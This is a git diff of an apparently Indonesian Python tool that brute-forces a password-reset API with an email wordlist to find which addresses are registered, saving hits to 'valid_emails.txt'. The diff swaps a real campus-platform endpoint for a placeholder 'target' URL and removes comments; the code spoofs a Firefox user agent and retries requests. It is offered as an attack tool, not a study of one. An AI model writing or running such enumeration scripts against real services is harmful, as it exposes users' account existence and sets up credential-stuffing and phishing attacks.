@@ -4,9 +4,9 @@ from pathlib import Path
 from colorama import Fore, Style
 
 # Konfigurasi
-url = "https://api.kampusgratis.id/api/v1/reset-password/request"
+url = "https://target/api/v1/reset-password/request"
 email_list = "D:/XAMMP/htdocs/tools/email_wordlists.txt"
-output_file = Path(__file__).parent / "valid_emails.txt"  # Simpan hasil di folder yang sama dengan skrip
+output_file = Path(__file__).parent / "valid_emails.txt"
 headers = {
     "Accept": "application/json, text/plain, */*",
     "Accept-Language": "en-US,en;q=0.5",
@@ -16,7 +16,6 @@ headers = {
     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0"
 }
 
-# Fungsi untuk membaca file
 def read_file(file_path):
     try:
         with open(file_path, "r") as f:
@@ -25,15 +24,13 @@ def read_file(file_path):
         print(Fore.RED + f"[ERROR] File {file_path} tidak ditemukan." + Style.RESET_ALL)
         return []
 
-# Fungsi untuk menyimpan hasil valid
 def save_valid_email(email):
     try:
         with open(output_file, "a") as f:
             f.write(email + "\n")
     except Exception as e:
         print(Fore.RED + f"[ERROR] Gagal menyimpan email valid: {e}" + Style.RESET_ALL)
-
-# Fungsi untuk mencoba email
+        
 def attempt_email(email):
     data = {"email": email}
     retries = 0
@@ -58,7 +55,6 @@ def attempt_email(email):
             print(Fore.RED + f"[ERROR] {e}" + Style.RESET_ALL)
             break
 
-# Fungsi utama brute force
 def brute_force():
     emails = read_file(email_list)
 
